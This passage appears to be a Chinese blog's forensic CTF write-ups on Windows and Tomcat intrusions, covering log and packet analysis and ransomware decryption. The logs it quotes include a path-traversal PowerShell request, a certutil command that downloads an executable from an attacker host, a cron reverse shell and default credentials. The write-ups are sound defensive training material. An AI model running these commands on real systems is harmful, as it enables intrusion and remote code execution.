<h5 id="http-wakuang-zhigongshanfang-top这个就是矿池域名"><a href="#http-wakuang-zhigongshanfang-top这个就是矿池域名" class="headerlink" title="http://wakuang.zhigongshanfang.top这个就是矿池域名"></a><code>http://wakuang.zhigongshanfang.top</code>这个就是矿池域名</h5><h1 id="DAY8"><a href="#DAY8" class="headerlink" title="DAY8"></a>DAY8</h1><h2 id="第四章-windows实战-wordpress"><a href="#第四章-windows实战-wordpress" class="headerlink" title="第四章 windows实战-wordpress"></a>第四章 windows实战-wordpress</h2><h3 id="解题过程-4"><a href="#解题过程-4" class="headerlink" title="解题过程"></a>解题过程</h3><h4 id="1-请提交攻击者攻击成功的第一时间，格式：flag-YY-MM-DD-hh-mm-ss"><a href="#1-请提交攻击者攻击成功的第一时间，格式：flag-YY-MM-DD-hh-mm-ss" class="headerlink" title="1.请提交攻击者攻击成功的第一时间，格式：flag{YY:MM:DD hh:mm:ss}"></a>1.请提交攻击者攻击成功的第一时间，格式：flag{YY:MM:DD hh:mm:ss}</h4><h5 id="RDP连接到远程桌面之后，打开phpstudy打开根目录，然后找到phpstudy的位置，既然是找黑客攻击的目录，我们先去分析访问服务器的日志，打开日志前面都是黑客使用工具爆破然后welcome-php里面显示200"><a href="#RDP连接到远程桌面之后，打开phpstudy打开根目录，然后找到phpstudy的位置，既然是找黑客攻击的目录，我们先去分析访问服务器的日志，打开日志前面都是黑客使用工具爆破然后welcome-php里面显示200" class="headerlink" title="RDP连接到远程桌面之后，打开phpstudy打开根目录，然后找到phpstudy的位置，既然是找黑客攻击的目录，我们先去分析访问服务器的日志，打开日志前面都是黑客使用工具爆破然后welcome.php里面显示200"></a>RDP连接到远程桌面之后，打开phpstudy打开根目录，然后找到phpstudy的位置，既然是找黑客攻击的目录，我们先去分析访问服务器的日志，打开日志前面都是黑客使用工具爆破然后welcome.php里面显示200</h5><h5 id="-21"><a href="#-21" class="headerlink" title=""></a><img src="https://free.picui.cn/free/2025/08/06/68930b13881c5.png" alt="1754467093751.png"></h5><h4 id="2-请提交攻击者的浏览器版本-flag-Firgfox-2200"><a href="#2-请提交攻击者的浏览器版本-flag-Firgfox-2200" class="headerlink" title="2.请提交攻击者的浏览器版本 flag{Firgfox&#x2F;2200}"></a>2.请提交攻击者的浏览器版本 flag{Firgfox&#x2F;2200}</h4><h5 id="分析日志得到flag-Firefox-110-0"><a href="#分析日志得到flag-Firefox-110-0" class="headerlink" title="分析日志得到flag{Firefox&#x2F;110.0}"></a>分析日志得到flag{Firefox&#x2F;110.0}</h5><h4 id="3-请提交攻击者目录扫描所使用的工具名称"><a href="#3-请提交攻击者目录扫描所使用的工具名称" class="headerlink" title="3.请提交攻击者目录扫描所使用的工具名称"></a>3.请提交攻击者目录扫描所使用的工具名称</h4><h5 id="分析日志得到flag-Fuzz-Faster-U-Fool"><a href="#分析日志得到flag-Fuzz-Faster-U-Fool" class="headerlink" title="分析日志得到flag{Fuzz Faster U Fool}"></a>分析日志得到flag{Fuzz Faster U Fool}</h5><h4 id="4-找到攻击者写入的恶意后门文件，提交文件名（完整路径）"><a href="#4-找到攻击者写入的恶意后门文件，提交文件名（完整路径）" class="headerlink" title="4.找到攻击者写入的恶意后门文件，提交文件名（完整路径）"></a>4.找到攻击者写入的恶意后门文件，提交文件名（完整路径）</h4><h5 id="将www目录down下来可以，用D盾扫面得到"><a href="#将www目录down下来可以，用D盾扫面得到" class="headerlink" title="将www目录down下来可以，用D盾扫面得到"></a>将www目录down下来可以，用D盾扫面得到</h5><h5 id="-22"><a href="#-22" class="headerlink" title=""></a><img src="https://free.picui.cn/free/2025/08/06/68930b1349347.png" alt="1754467093751.png"></h5><h5 id="flag-C-phpstudy-pro-WWW-x-php"><a href="#flag-C-phpstudy-pro-WWW-x-php" class="headerlink" title="flag{C:\phpstudy_pro\WWW.x.php}"></a>flag{C:\phpstudy_pro\WWW.x.php}</h5><h4 id="5-找到攻击者隐藏在正常web应用代码中的恶意代码，提交该文件名（完整路径）"><a href="#5-找到攻击者隐藏在正常web应用代码中的恶意代码，提交该文件名（完整路径）" class="headerlink" title="5.找到攻击者隐藏在正常web应用代码中的恶意代码，提交该文件名（完整路径）"></a>5.找到攻击者隐藏在正常web应用代码中的恶意代码，提交该文件名（完整路径）</h4><h5 id="-23"><a href="#-23" class="headerlink" title=""></a><img src="https://free.picui.cn/free/2025/08/06/68930b1382fde.png" alt="1754467093751.png"></h5><h5 id="flag-C-phpstudy-pro-WWW-usr-themes-default-post-php"><a href="#flag-C-phpstudy-pro-WWW-usr-themes-default-post-php" class="headerlink" title="flag{C:\phpstudy_pro\WWW\usr\themes\default\post.php}"></a>flag{C:\phpstudy_pro\WWW\usr\themes\default\post.php}</h5><h4 id="6-请指出可疑进程采用的自动启动的方式，启动的脚本的名字-flag-1-exe"><a href="#6-请指出可疑进程采用的自动启动的方式，启动的脚本的名字-flag-1-exe" class="headerlink" title="6.请指出可疑进程采用的自动启动的方式，启动的脚本的名字 flag{1.exe}"></a>6.请指出可疑进程采用的自动启动的方式，启动的脚本的名字 flag{1.exe}</h4><h5 id="这里不太明白，具体是在windows下找到360-exe文件，运行之后生成了x-bat"><a href="#这里不太明白，具体是在windows下找到360-exe文件，运行之后生成了x-bat" class="headerlink" title="这里不太明白，具体是在windows下找到360.exe文件，运行之后生成了x.bat"></a>这里不太明白，具体是在windows下找到360.exe文件，运行之后生成了x.bat</h5><h5 id="flag-x-bat"><a href="#flag-x-bat" class="headerlink" title="flag{x.bat}"></a>flag{x.bat}</h5><h1 id="DAY9"><a href="#DAY9" class="headerlink" title="DAY9"></a>DAY9</h1><h2 id="第四章-windows实战-向日葵"><a href="#第四章-windows实战-向日葵" class="headerlink" title="第四章 windows实战-向日葵"></a>第四章 windows实战-向日葵</h2><h3 id="知识点：-2"><a href="#知识点：-2" class="headerlink" title="知识点："></a>知识点：</h3><h3 id="解题过程：-4"><a href="#解题过程：-4" class="headerlink" title="解题过程："></a>解题过程：</h3><h4 id="1-通过本地-PC-RDP到服务器并且找到黑客首次攻击成功的时间为-为多少-将黑客首次攻击成功的时间为-作为-FLAG-提交-2028-03-26-08-11-25-123"><a href="#1-通过本地-PC-RDP到服务器并且找到黑客首次攻击成功的时间为-为多少-将黑客首次攻击成功的时间为-作为-FLAG-提交-2028-03-26-08-11-25-123" class="headerlink" title="1.通过本地 PC RDP到服务器并且找到黑客首次攻击成功的时间为 为多少,将黑客首次攻击成功的时间为 作为 FLAG 提交(2028-03-26 08:11:25.123);"></a>1.通过本地 PC RDP到服务器并且找到黑客首次攻击成功的时间为 为多少,将黑客首次攻击成功的时间为 作为 FLAG 提交(2028-03-26 08:11:25.123);</h4><h5 id="找第一次攻击成功的时间，我们去去分析日志，因为是首次我们先从第时间最早的日志分析"><a href="#找第一次攻击成功的时间，我们去去分析日志，因为是首次我们先从第时间最早的日志分析" class="headerlink" title="找第一次攻击成功的时间，我们去去分析日志，因为是首次我们先从第时间最早的日志分析"></a>找第一次攻击成功的时间，我们去去分析日志，因为是首次我们先从第时间最早的日志分析</h5><h5 id="-24"><a href="#-24" class="headerlink" title=""></a><img src="https://free.picui.cn/free/2025/08/06/68930b16ad9b7.png" alt="1754467093751.png"></h5><h5 id="-25"><a href="#-25" class="headerlink" title=""></a><img src="https://free.picui.cn/free/2025/08/06/68930b16b23d0.png" alt="1754467093751.png"></h5><h5 id="可以看到这里是黑客进行的一些攻击的姿势，模板注入，sql注入，rce一些的，一直往下看分析可以看到这里其实一直没拿到shell-继续分析，可以看到到老后面"><a href="#可以看到这里是黑客进行的一些攻击的姿势，模板注入，sql注入，rce一些的，一直往下看分析可以看到这里其实一直没拿到shell-继续分析，可以看到到老后面" class="headerlink" title="可以看到这里是黑客进行的一些攻击的姿势，模板注入，sql注入，rce一些的，一直往下看分析可以看到这里其实一直没拿到shell,继续分析，可以看到到老后面"></a>可以看到这里是黑客进行的一些攻击的姿势，模板注入，sql注入，rce一些的，一直往下看分析可以看到这里其实一直没拿到shell,继续分析，可以看到到老后面</h5><h5 id="-26"><a href="#-26" class="headerlink" title=""></a><img src="https://free.picui.cn/free/2025/08/06/68930b16cc7cf.png" alt="1754467093752.png"></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">分析：</span><br><span class="line">攻击者使用..来尝试遍历目录结构，到达Windows系统的system32目录，然后执行WindowsPowerShell\v1.0\powershell.exe，去执行命令</span><br></pre></td></tr></table></figure>



<h5 id="在这之后攻击者的姿势也就不变了，利用这个去执行whomi-pwd一些命令，还有如下面代码块"><a href="#在这之后攻击者的姿势也就不变了，利用这个去执行whomi-pwd一些命令，还有如下面代码块" class="headerlink" title="在这之后攻击者的姿势也就不变了，利用这个去执行whomi,pwd一些命令，还有如下面代码块"></a>在这之后攻击者的姿势也就不变了，利用这个去执行whomi,pwd一些命令，还有如下面代码块</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2024-03-26 10:16:25.585	- Info  -	[][] new RC HTTP connection 192.168.31.45:64247,/check?cmd=ping..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fsystem32%2FWindowsPowerShell%2Fv1.0%2Fpowershell.exe+whoami, plugin:check, session:dmPqDgSa8jOYgp1Iu1U7l1HbRTVJwZL3</span><br></pre></td></tr></table></figure>

<h5 id="所以这里是首次攻击成功的地方"><a href="#所以这里是首次攻击成功的地方" class="headerlink" title="所以这里是首次攻击成功的地方"></a>所以这里是首次攻击成功的地方</h5><h5 id="flag-2024-03-26-10-16-25-585"><a href="#flag-2024-03-26-10-16-25-585" class="headerlink" title="flag{2024-03-26 10:16:25.585}"></a><strong>flag{2024-03-26 10:16:25.585}</strong></h5><h4 id="2-通过本地-PC-RDP到服务器并且找到黑客攻击的-IP-为多少-将黑客攻击-IP-作为-FLAG-提交"><a href="#2-通过本地-PC-RDP到服务器并且找到黑客攻击的-IP-为多少-将黑客攻击-IP-作为-FLAG-提交" class="headerlink" title="2.通过本地 PC RDP到服务器并且找到黑客攻击的 IP 为多少,将黑客攻击 IP 作为 FLAG 提交;"></a>2.通过本地 PC RDP到服务器并且找到黑客攻击的 IP 为多少,将黑客攻击 IP 作为 FLAG 提交;</h4><h5 id="在之前分析的时候就已经知道了"><a href="#在之前分析的时候就已经知道了" class="headerlink" title="在之前分析的时候就已经知道了"></a>在之前分析的时候就已经知道了</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[][] new acceptor 192.168.31.45:64246--&gt;192.168.31.114:49724</span><br></pre></td></tr></table></figure>

<h5 id="flag-192-168-31-45"><a href="#flag-192-168-31-45" class="headerlink" title="flag{192.168.31.45}"></a><strong>flag{192.168.31.45}</strong></h5><h4 id="3-通过本地-PC-RDP到服务器并且找到黑客托管恶意程序-IP-为-将黑客托管恶意程序-IP-作为-FLAG-提交"><a href="#3-通过本地-PC-RDP到服务器并且找到黑客托管恶意程序-IP-为-将黑客托管恶意程序-IP-作为-FLAG-提交" class="headerlink" title="3.通过本地 PC RDP到服务器并且找到黑客托管恶意程序 IP 为,将黑客托管恶意程序 IP 作为 FLAG 提交;"></a>3.通过本地 PC RDP到服务器并且找到黑客托管恶意程序 IP 为,将黑客托管恶意程序 IP 作为 FLAG 提交;</h4><h5 id="我们继续往下分析黑客的攻击手法"><a href="#我们继续往下分析黑客的攻击手法" class="headerlink" title="我们继续往下分析黑客的攻击手法"></a>我们继续往下分析黑客的攻击手法</h5><h5 id="-27"><a href="#-27" class="headerlink" title=""></a><img src="https://free.picui.cn/free/2025/08/06/68930b17ca4f0.png" alt="1754467093752.png"></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">分析：</span><br><span class="line">利用certutil来下载并执行远程文件的攻击</span><br><span class="line">构造一个恶意的HTTP GET请求，尝试从远程地址http://192.168.31.249/main.exe下载一个名为main.exe的可执行文件，并在目标机器上执行。</span><br><span class="line">powershell.exe -command &quot;certutil -urlcache -split -f http://192.168.31.249/main.exe&quot;</span><br></pre></td></tr></table></figure>

<h5 id="flag-192-168-31-249"><a href="#flag-192-168-31-249" class="headerlink" title="flag{192.168.31.249}"></a><strong>flag{192.168.31.249}</strong></h5><h4 id="4-找到黑客解密-DEC-文件-将黑客DEC-文件的-md5-作为-FLAG-提交"><a href="#4-找到黑客解密-DEC-文件-将黑客DEC-文件的-md5-作为-FLAG-提交" class="headerlink" title="4.找到黑客解密 DEC 文件,将黑客DEC 文件的 md5 作为 FLAG 提交;"></a>4.找到黑客解密 DEC 文件,将黑客DEC 文件的 md5 作为 FLAG 提交;</h4><h5 id="DEC…-decode-这个文件真没找到-继续分析日志"><a href="#DEC…-decode-这个文件真没找到-继续分析日志" class="headerlink" title="DEC…..&#x3D;decode,这个文件真没找到,继续分析日志"></a>DEC…..&#x3D;decode,这个文件真没找到,继续分析日志</h5><h5 id="-28"><a href="#-28" class="headerlink" title=""></a><img src="https://free.picui.cn/free/2025/08/06/68930b17c9b45.png" alt="1754467093752.png"></h5><h5 id="这个操作是把一串数字加入了qq-txt文件，就试着加一下这个qq号，是玄机的官方群，在群文件看到了DEC-pem，文件内部是一个私钥，用在线工具把文件MD5加密"><a href="#这个操作是把一串数字加入了qq-txt文件，就试着加一下这个qq号，是玄机的官方群，在群文件看到了DEC-pem，文件内部是一个私钥，用在线工具把文件MD5加密" class="headerlink" title="这个操作是把一串数字加入了qq.txt文件，就试着加一下这个qq号，是玄机的官方群，在群文件看到了DEC.pem，文件内部是一个私钥，用在线工具把文件MD5加密"></a>这个操作是把一串数字加入了qq.txt文件，就试着加一下这个qq号，是玄机的官方群，在群文件看到了DEC.pem，文件内部是一个私钥，用在线工具把文件MD5加密</h5><h5 id="flag-5ad8d202f80202f6d31e077fc9b0fc6b"><a href="#flag-5ad8d202f80202f6d31e077fc9b0fc6b" class="headerlink" title="flag{5ad8d202f80202f6d31e077fc9b0fc6b}"></a><strong>flag{5ad8d202f80202f6d31e077fc9b0fc6b}</strong></h5><h4 id="5-通过本地-PC-RDP到服务器并且解密黑客勒索软件-将桌面加密文件中关键信息作为-FLAG-提交"><a href="#5-通过本地-PC-RDP到服务器并且解密黑客勒索软件-将桌面加密文件中关键信息作为-FLAG-提交" class="headerlink" title="5.通过本地 PC RDP到服务器并且解密黑客勒索软件,将桌面加密文件中关键信息作为 FLAG 提交;"></a>5.通过本地 PC RDP到服务器并且解密黑客勒索软件,将桌面加密文件中关键信息作为 FLAG 提交;</h4><h5 id="桌面上有两个文件"><a href="#桌面上有两个文件" class="headerlink" title="桌面上有两个文件"></a>桌面上有两个文件</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">baoleiji.txt.banana</span><br><span class="line">N2xTZ2Bsn2Y5lve7KZ36bgsFjqncBs55VO0zkeEIr5Iga/kbegA0BAstotBWnZ16+trNfkzl3apUobodMkC8covEo22p+kWAyVjMRyJ98EQ4Pspr/Y5HIuH0xuvPa82j7b0AMJHkyd2viuymI/mrxjJk2X0xlEE4YVioMLd22+w=</span><br><span class="line"></span><br><span class="line">Your files have been encrypted</span><br><span class="line"></span><br><span class="line">0sWK8adKSGh1Xaxo6n1mZFoyNDYVokXwkBhxnzxU+MEJIV44u48SdOiFzWLn849hObaP6z26lLtMnXaDUnAPuMh+nF2hw9RoAsur7KYxE8/iY/y4jOEBsHT5wvQldcNfntrDyMUCvrWTUHl2yapUmaIIf2rZsNsqMVJ9puZzp58+FJmulyC7R1C2yoP1jHhsdOkU7htbzUWWsm2ybL+eVpXTFC+i6nuEBoAYhv2kjSgL8qKBFsLKmKQSn/ILRPaRYDFP/srEQzF7Y4yZa4cotpFTdGUVU547Eib/EaNuhTyzgOGKjXl2UYxHM/v0c3lgjO7GDA9eF3a/BBXPAgtK126lUfoGK7iSAhduRt5sRP4=</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">desktop.ini.banana</span><br><span class="line">onEDpnamFbekYxixEQ30W6ZcEXjCUrKHP+APxzuJQZD8bS+4V5Tu+7XmxT24EuNSfoGnda+obAmy2d1E2WT/0MmT4VHNIUyX15JuOcd477c7Zj5v3qtzoJk8Rmtub9RL0vDDjwYKPzyS4wxSyqhRfggenLiSFxhrY32nnf42W30=</span><br><span class="line"></span><br><span class="line">Your files have been encrypted</span><br><span class="line"></span><br><span class="line">X6cNmnKCuxdTl+f5XLhmYY4oFovJGebCmpP94be/VVqNQe0cLJm3RtX84MO98b8fI0zY50xC4OjK5aHOz2zFxCvxHygFR+rIgL0XC2rruzCAukTLJqjjbNRH06alTMMdrxhRVdrC73PMBQBweyProof4ZYNZ4YHnZrej6Vq/Ipr2xeUqamHkysjFPNqA8DVDuXYYlTUuDzZdPZpWM3IDbUDMNi4ilrPEe47IXAxd8nrqTHgX+3X7YiOjuayqK8li2c2xMXoXuSce+rAeNsWHv9SUEqUTP+MJHll7MGYLZSvYpkCVacP3joKJoI/bfoVRX8FlCuCMkicFnTawY0ZxKiX7f+0Wv+KYP0st5SYjWhMWklNSEEG7TH24wZeCANjf</span><br></pre></td></tr></table></figure>

<h5 id="在文本Your-files-have-been-encrypted前面的是RSA加密文本，后面是RSA，利用之前的得到的私钥对rsa解密，得到AES的密钥"><a href="#在文本Your-files-have-been-encrypted前面的是RSA加密文本，后面是RSA，利用之前的得到的私钥对rsa解密，得到AES的密钥" class="headerlink" title="在文本Your files have been encrypted前面的是RSA加密文本，后面是RSA，利用之前的得到的私钥对rsa解密，得到AES的密钥"></a>在文本Your files have been encrypted前面的是RSA加密文本，后面是RSA，利用之前的得到的私钥对rsa解密，得到AES的密钥</h5><p>[]: <a target="_blank" rel="noopener" href="https://the-x.cn/cryptography/Aes.aspx">https://the-x.cn/cryptography/Aes.aspx</a><br>[]: <a target="_blank" rel="noopener" href="https://tool.ip138.com/rsa/">https://tool.ip138.com/rsa/</a></p>
<h5 id="解密后"><a href="#解密后" class="headerlink" title="解密后"></a>解密后</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">@suanve</span><br><span class="line">时间是连续的，年份只是人类虚构出来用于统计的单位，2024年第一天和2023年最后一天，</span><br><span class="line">不会有任何本质区别。你的花呗，你的客户,你的体检报告，窗外的寒风，都不会因为这是新的一年，</span><br><span class="line">而停下对你的毒打。</span><br><span class="line">GIVE YOU FLAG!!!!!</span><br><span class="line">flag&#123;EDISEC_15c2e33e-b93f-452c-9523-bbb9e2090cd1&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">desktop.ini.banana</span><br><span class="line">[]</span><br><span class="line">LocalizedResourceName=@%SystemRoot%\system32\shell32.dll,-21769</span><br><span class="line">IconResource=%SystemRoot%\system32\imageres.dll,-183</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="flag-EDISEC-15c2e33e-b93f-452c-9523-bbb9e2090cd1"><a href="#flag-EDISEC-15c2e33e-b93f-452c-9523-bbb9e2090cd1" class="headerlink" title="flag{EDISEC_15c2e33e-b93f-452c-9523-bbb9e2090cd1}"></a><strong>flag{EDISEC_15c2e33e-b93f-452c-9523-bbb9e2090cd1}</strong></h5><h1 id="DAY10"><a href="#DAY10" class="headerlink" title="DAY10"></a>DAY10</h1><h2 id="第六章-流量特征分析-常见攻击事件-tomcat"><a href="#第六章-流量特征分析-常见攻击事件-tomcat" class="headerlink" title="第六章 流量特征分析-常见攻击事件 tomcat"></a>第六章 流量特征分析-常见攻击事件 tomcat</h2><h3 id="解题过程：-5"><a href="#解题过程：-5" class="headerlink" title="解题过程："></a>解题过程：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1、在web服务器上发现的可疑活动,流量分析会显示很多请求,这表明存在恶意的扫描行为,通过分析扫描的行为后提交攻击者IP  flag格式：flag&#123;ip&#125;，如：flag&#123;127.0.0.1&#125;</span><br><span class="line">2、找到攻击者IP后请通过技术手段确定其所在地址 flag格式: flag&#123;城市英文小写&#125;</span><br><span class="line">3、哪一个端口提供对web服务器管理面板的访问？ flag格式：flag&#123;2222&#125;</span><br><span class="line">4、经过前面对攻击者行为的分析后,攻击者运用的工具是？ flag格式：flag&#123;名称&#125;</span><br><span class="line">5、攻击者拿到特定目录的线索后,想要通过暴力破解的方式登录,请通过分析流量找到攻击者登录成功的用户名和密码？ flag格式：flag&#123;root-123&#125;</span><br><span class="line">6、攻击者登录成功后,先要建立反弹shell,请分析流量提交恶意文件的名称？ flag格式：flag&#123;114514.txt&#125;</span><br><span class="line">7、攻击者想要维持提权成功后的登录,请分析流量后提交关键的信息？ flag提示,某种任务里的信息</span><br></pre></td></tr></table></figure>

<h4 id="1、在web服务器上发现的可疑活动-流量分析会显示很多请求-这表明存在恶意的扫描行为-通过分析扫描的行为后提交攻击者IP-flag格式：flag-ip-，如：flag-127-0-0-1"><a href="#1、在web服务器上发现的可疑活动-流量分析会显示很多请求-这表明存在恶意的扫描行为-通过分析扫描的行为后提交攻击者IP-flag格式：flag-ip-，如：flag-127-0-0-1" class="headerlink" title="1、在web服务器上发现的可疑活动,流量分析会显示很多请求,这表明存在恶意的扫描行为,通过分析扫描的行为后提交攻击者IP  flag格式：flag{ip}，如：flag{127.0.0.1}"></a>1、在web服务器上发现的可疑活动,流量分析会显示很多请求,这表明存在恶意的扫描行为,通过分析扫描的行为后提交攻击者IP  flag格式：flag{ip}，如：flag{127.0.0.1}</h4><h5 id="http过滤看到14-0-0-120大量的请求"><a href="#http过滤看到14-0-0-120大量的请求" class="headerlink" title="http过滤看到14.0.0.120大量的请求"></a>http过滤看到14.0.0.120大量的请求</h5><h5 id="-29"><a href="#-29" class="headerlink" title=""></a><img src="https://free.picui.cn/free/2025/08/06/68930b1e790a9.png" alt="1754467093753.png"></h5><h4 id="2、找到攻击者IP后请通过技术手段确定其所在地址-flag格式-flag-城市英文小写"><a href="#2、找到攻击者IP后请通过技术手段确定其所在地址-flag格式-flag-城市英文小写" class="headerlink" title="2、找到攻击者IP后请通过技术手段确定其所在地址 flag格式: flag{城市英文小写}"></a>2、找到攻击者IP后请通过技术手段确定其所在地址 flag格式: flag{城市英文小写}</h4><h5 id="-30"><a href="#-30" class="headerlink" title=""></a><img src="https://free.picui.cn/free/2025/08/06/68930b2081c16.png" alt="1754467093753.png"></h5><h4 id="3、哪一个端口提供对web服务器管理面板的访问？-flag格式：flag-2222"><a href="#3、哪一个端口提供对web服务器管理面板的访问？-flag格式：flag-2222" class="headerlink" title="3、哪一个端口提供对web服务器管理面板的访问？ flag格式：flag{2222}"></a>3、哪一个端口提供对web服务器管理面板的访问？ flag格式：flag{2222}</h4><h5 id="Web服务器管理面板通常通过HTTP或HTTPS进行访问继续http过滤再去分析具体的包"><a href="#Web服务器管理面板通常通过HTTP或HTTPS进行访问继续http过滤再去分析具体的包" class="headerlink" title="Web服务器管理面板通常通过HTTP或HTTPS进行访问继续http过滤再去分析具体的包"></a>Web服务器管理面板通常通过HTTP或HTTPS进行访问继续http过滤再去分析具体的包</h5><h5 id="-31"><a href="#-31" class="headerlink" title=""></a><img src="https://free.picui.cn/free/2025/08/06/68930b203ac0b.png" alt="1754467093753.png"></h5><h4 id="4、经过前面对攻击者行为的分析后-攻击者运用的工具是？-flag格式：flag-名称"><a href="#4、经过前面对攻击者行为的分析后-攻击者运用的工具是？-flag格式：flag-名称" class="headerlink" title="4、经过前面对攻击者行为的分析后,攻击者运用的工具是？ flag格式：flag{名称}"></a>4、经过前面对攻击者行为的分析后,攻击者运用的工具是？ flag格式：flag{名称}</h4><h5 id="-32"><a href="#-32" class="headerlink" title=""></a><img src="https://free.picui.cn/free/2025/08/06/68930b218ec56.png" alt="1754467093753.png"></h5><h4 id="-33"><a href="#-33" class="headerlink" title=""></a><img src="https://free.picui.cn/free/2025/08/06/68930b228b058.png" alt="1754467093754.png"></h4><h4 id="5、攻击者拿到特定目录的线索后-想要通过暴力破解的方式登录-请通过分析流量找到攻击者登录成功的用户名和密码？-flag格式：flag-root-123"><a href="#5、攻击者拿到特定目录的线索后-想要通过暴力破解的方式登录-请通过分析流量找到攻击者登录成功的用户名和密码？-flag格式：flag-root-123" class="headerlink" title="5、攻击者拿到特定目录的线索后,想要通过暴力破解的方式登录,请通过分析流量找到攻击者登录成功的用户名和密码？ flag格式：flag{root-123}"></a>5、攻击者拿到特定目录的线索后,想要通过暴力破解的方式登录,请通过分析流量找到攻击者登录成功的用户名和密码？ flag格式：flag{root-123}</h4><p>在这里看到一个POST包</p>
<h5 id="-34"><a href="#-34" class="headerlink" title=""></a><img src="https://free.picui.cn/free/2025/08/06/68930b24ceb5a.png" alt="1754467093754.png"></h5><p><img src="https://free.picui.cn/free/2025/08/06/68930b252a16f.png" alt="1754467093754.png"></p>
<p>数据包里面这里可以看到，上传了恶意文件，证明已经进来了，并且看到Authorization里面：</p>
<p>解密：admin:tomcat</p>
<h4 id="6、攻击者登录成功后-先要建立反弹shell-请分析流量提交恶意文件的名称？-flag格式：flag-114514-txt"><a href="#6、攻击者登录成功后-先要建立反弹shell-请分析流量提交恶意文件的名称？-flag格式：flag-114514-txt" class="headerlink" title="6、攻击者登录成功后,先要建立反弹shell,请分析流量提交恶意文件的名称？ flag格式：flag{114514.txt}"></a>6、攻击者登录成功后,先要建立反弹shell,请分析流量提交恶意文件的名称？ flag格式：flag{114514.txt}</h4><h5 id="在上传恶意文件这个包后面几个包看到这里有在建立反弹shell"><a href="#在上传恶意文件这个包后面几个包看到这里有在建立反弹shell" class="headerlink" title="在上传恶意文件这个包后面几个包看到这里有在建立反弹shell"></a>在上传恶意文件这个包后面几个包看到这里有在建立反弹shell</h5><h5 id="-35"><a href="#-35" class="headerlink" title=""></a><img src="/d8.png"></h5><h5 id="-36"><a href="#-36" class="headerlink" title=""></a><img src="https://free.picui.cn/free/2025/08/06/68930b281cbbe.png" alt="1754467093754.png"></h5><h4 id="7、攻击者想要维持提权成功后的登录-请分析流量后提交关键的信息？-flag提示-某种任务里的信息"><a href="#7、攻击者想要维持提权成功后的登录-请分析流量后提交关键的信息？-flag提示-某种任务里的信息" class="headerlink" title="7、攻击者想要维持提权成功后的登录,请分析流量后提交关键的信息？ flag提示,某种任务里的信息"></a>7、攻击者想要维持提权成功后的登录,请分析流量后提交关键的信息？ flag提示,某种任务里的信息</h4><h5 id="这里有"><a href="#这里有" class="headerlink" title="这里有"></a>这里有</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">crontab -l：</span><br><span class="line">每分钟尝试通过TCP/IP连接到14.0.0.120的443端口的命令。</span><br></pre></td></tr></table></figure>

<h5 id="-37"><a href="#-37" class="headerlink" title=""></a><img src="https://free.picui.cn/free/2025/08/06/68930b289395b.png" alt="1754467093754.png"></h5><h1 id="DAY11"><a href="#DAY11" class="headerlink" title="DAY11"></a>DAY11</h1><h2 id="第六章-流量特征分析-waf-上的截获的黑客攻击流量"><a href="#第六章-流量特征分析-waf-上的截获的黑客攻击流量" class="headerlink" title="第六章 流量特征分析-waf 上的截获的黑客攻击流量"></a>第六章 流量特征分析-waf 上的截获的黑客攻击流量</h2><h3 id="解题过程-5"><a href="#解题过程-5" class="headerlink" title="解题过程"></a>解题过程</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.黑客成功登录系统的密码 flag&#123;xxxxxxxxxxxxxxx&#125;</span><br><span class="line">2.黑客发现的关键字符串 flag&#123;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&#125;</span><br><span class="line">3.黑客找到的数据库密码 flag&#123;xxxxxxxxxxxxxxxx&#125;</span><br></pre></td></tr></table></figure>

<h4 id="1-黑客成功登录系统的密码-flag-xxxxxxxxxxxxxxx"><a href="#1-黑客成功登录系统的密码-flag-xxxxxxxxxxxxxxx" class="headerlink" title="1.黑客成功登录系统的密码 flag{xxxxxxxxxxxxxxx}:"></a>1.黑客成功登录系统的密码 flag{xxxxxxxxxxxxxxx}:</h4><p>黑客登录我们得看POST的包（大部分登录包都是通过POST的发包），但其实POST的包太多了，分析一下大概确实登录是login.php定位到他，我是直接翻到后面，因为拿到账号密码，在进行其他恶意活动</p>
<p><img src="https://free.picui.cn/free/2025/08/06/68930b2a0989e.png" alt="1754467093754.png"></p>
<p>就是这里，下面还有一个但是不是我们要的，下面那个是“人事”的</p>
<p><img src="https://free.picui.cn/free/2025/08/06/68930b2a55e5a.png" alt="1754467093754.png"></p>
<p>后面就是黑客打上了一个内存马，在通过一系列的命令执行来达到他的目的，以及后面的答案，都在流量包里</p>
